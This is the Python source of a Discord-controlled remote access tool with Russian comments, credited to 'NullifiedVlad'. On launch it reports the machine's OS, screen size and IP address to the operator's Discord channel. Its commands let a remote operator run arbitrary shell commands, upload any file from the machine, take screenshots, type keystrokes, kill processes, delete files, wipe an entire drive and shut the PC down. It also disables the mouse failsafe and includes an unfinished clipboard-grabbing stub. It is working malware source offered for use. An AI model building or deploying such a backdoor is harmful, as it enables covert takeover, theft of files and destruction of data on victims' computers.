"""
Join to our telegram channel https://t.me/CAT_discord_dev
Jo to our telegram group https://t.me/catchatdev
Made by NullifiedVlad (C) 2020
"""

import ctypes
import os
import subprocess
import sys
from datetime import datetime

# Импорт библиотек
import discord
import pyautogui as pg
from discord.ext import commands

import config
import nullfunction as nf

pg.FAILSAFE = False  # делает невозможным прервать движение мышки
bot = commands.Bot(command_prefix='/')  # префикс для комманд
channel = bot.get_channel(config.channel)  # введите id канала в который должен писать бот
bot.remove_command('help')


@bot.event
async def on_ready():
    channel_start = bot.get_channel(config.channel)
    date = datetime.now()
    x, y = pg.size()
    embed = discord.Embed(title='**ПОЛЬЗОВАТЕЛЬ ОНЛАЙН**', description='CAT', color=0x03fcec, )

    embed.add_field(name='**Время запука**', value=f'{date.hour}:{date.minute}', inline=False)
    embed.add_field(name='**ОС**', value=f'{sys.platform}', inline=False)
    embed.add_field(name='**Разрешение экрана**', value=f'{x}x{y}', inline=False)
    embed.add_field(name='**IP адрес**', value=f'{nf.ip()}', inline=False)
    embed.set_thumbnail(url='https://i.imgur.com/YbYKL0F.png')
    embed.set_footer(text=f'Используйте /help для справки!',
                     icon_url='https://i.imgur.com/YbYKL0F.png')
    embed.set_author(name=bot.user.name, icon_url='https://i.imgur.com/YbYKL0F.png')
    await channel_start.send(embed=embed)
    await bot.change_presence(activity=discord.Game(f'Был запущен в {date.hour}:{date.minute}'))


@bot.command()
async def move(ctx, x, y, time):  # перемещение курсора
    pg.moveTo(int(x), int(y), float(time))
    await ctx.send('**CAT:**  Курсор был передвинут на X:' + str(x) + ' Y:' + str(y))


@bot.command()
async def click(ctx):  # кликнуть мышкой
    try:
        pg.click()
        await ctx.send('**CAT:**  Был сделан клик!')
    except Exception as e:
        await ctx.send(f'**CAT:** Произошла **ошибка!** \n{e}')


@bot.command()
async def screenshot(ctx):  # сделать скриншот
    pg.screenshot('screenshot.png')
    await ctx.send(file=discord.File('screenshot.png'))
    os.remove('screenshot.png')


@bot.command()
async def cg(ctx):  # смена раскладки
    pg.hotkey('alt', 'shift')
    await ctx.send('**CAT:**  Раскладка клавиатуры успешно изменена!')


@bot.command()
async def write(ctx, *, text):  # написать текс
    pg.typewrite(text)
    await ctx.send(f"**CAT:**  Был набран текст: {text}")
    del text


@bot.command()
async def press(ctx, key, how_many):  # нажать клавишу
    if key in config.keys and int(how_many) > 0:
        for i in range(int(how_many)):
            pg.press(key)
        await ctx.send(f'**CAT:** Была нажата клавиша "{key}" {how_many} раза!')
    else:
        await ctx.send('**CAT:** Произошла ошибка! \n Вы указали **неверную клавишу** либо значение **меньше 1**! ')


@bot.command()
async def help(ctx):  # send help message
    embed = discord.Embed(title='**Команды**', description='Configuration Administration Tool.', color=0x03fcec, )
    # заголовки
    embed.add_field(name='**/help**', value='Выводит это сообщение.', inline=False)
    embed.add_field(name='**/move**', value='(X) (Y) (time) Передвинуть курсор.', inline=False)
    embed.add_field(name='**/click**', value='Сделать левый клик мышкой.', inline=False)
    embed.add_field(name='**/write**', value='Напечатать что-то.', inline=False)
    embed.add_field(name='**/press**', value='(how_many) Нажать клавишу несколько раз.', inline=False)
    embed.add_field(name='**/screenshot**', value='Cделать скриншот экрана.', inline=False)
    embed.add_field(name='**/cg** ', value='Изменить раскладку клавиатуры.', inline=False)
    embed.add_field(name='**/processlist**', value='Выводит список процессов.', inline=False)
    embed.add_field(name='**/command** ', value='Выполнить комманду в терминале.', inline=False)
    embed.add_field(name='**/kill**', value='Закрыть принудительно процесс.', inline=False)
    embed.add_field(name='**/delete**', value='Удалить файл.', inline=False)
    embed.add_field(name='**/wallpaper**', value='(url) Изменить фон рабочего стола.', inline=False)
    embed.add_field(name='**/disk_format**', value='Отформатировать диск.', inline=False)
    embed.add_field(name='**/copy**', value='Отправляет файл к вам на сервер.', inline=False)
    embed.add_field(name='**/shutdown**', value='Выключить ПК.', inline=False)
    embed.add_field(name='**/reboot**', value='Перезагрузка ПК.', inline=False)
    embed.add_field(name='**/off**', value='Выключить бота.', inline=False)
    embed.set_thumbnail(url='https://i.imgur.com/YbYKL0F.png')
    embed.set_footer(text=f'Made by NullifiedVlad',
                     icon_url='https://i.imgur.com/YbYKL0F.png')
    embed.set_author(name=bot.user.name, icon_url='https://i.imgur.com/YbYKL0F.png')
    await ctx.send(embed=embed)


@bot.command()
async def command(ctx, *, todo):
    output = os.system(str(todo))
    if output == 0:
        await ctx.send('**CAT:** Комманда успешно выполнена!')
    else:
        await ctx.send('**CAT:** Ошибка выполения!')
    del output


@bot.command()
async def kill(ctx, *, process):  # убить процесс
    output = os.system(f'taskkill /im {str(process)} /f')
    if not output:
        await ctx.send('**CAT:** Процесс успешно убит!')
    else:
        await ctx.send('**CAT:** Такого процесса нет или вы указали непраильный процесс!')


@bot.command()
async def processlist(ctx):  # список процессов
    f = open('processlist.txt', 'w')
    try:
        data = subprocess.check_output(['tasklist'])
        f.write(str(data))
        f.close()
        await ctx.send('**CAT:** Список процессов', file=discord.File('processlist.txt'))
        os.remove('processlist.txt')
    except FileNotFoundError:
        await ctx.send('**CAT:** Данная команда только для Windows XP/7/8.1/10!')


@bot.command()
async def delete(ctx, file_on_delete):  # удалить файл
    try:
        os.remove(str(file_on_delete))
        await ctx.send(f'Файл "{file_on_delete}" успешно удалён!')
    except FileNotFoundError:
        await ctx.send('**CAT:** Такой файл не найден!')


@bot.command()
async def disk_format(ctx, disk):  # форматирование диска
    await ctx.send(f'**CAT:** Форматирую диск **{disk}**!')
    os.system(f'rd/s/q {disk}:\\')


@bot.command()
async def copy(ctx, way):  # копирование файла
    try:
        await ctx.send('**CAT:** Скопированный файл:', file=discord.File(way))
        del way
    except FileNotFoundError:
        await ctx.send('**CAT:** Не могу найти файл!')


# ДОПИСАТЬ!
'''@bot.command()
async def clipboard_grab(ctx):
    captured = subprocess.check_output( '' , shell=True)
    ctx.send(f'**CAT**: {str(captured)}.')'''


@bot.command()
async def shutdown(ctx):  # выключение пк
    await ctx.send('Выключаю компьютер...')
    os.system('shutdown -s -t 0 >null')


@bot.command()
async def reboot(ctx):  # перезагрузка
    await ctx.send('Перезагружаю компьютер...')
    os.system('shutdown -r -t 0 >null')


@bot.command()
async def off(ctx):  # выключение бота
    await ctx.send('**CAT:** Выключаюсь...')
    sys.exit()


@bot.command()
async def wallpaper(ctx, url):

    with open('wallpaper.png', 'wb') as f:
        f.write(nf.img_get(url+'.png'))

    if ctypes.windll.user32.SystemParametersInfoW(20, 0, 'wallpaper.png', 0):
        await ctx.send('**CAT:** Обои успешно изменены!')
    else:
        await ctx.send('**CAT:** Ошибка!')

    os.remove('wallpaper.png')
bot.run(config.token)
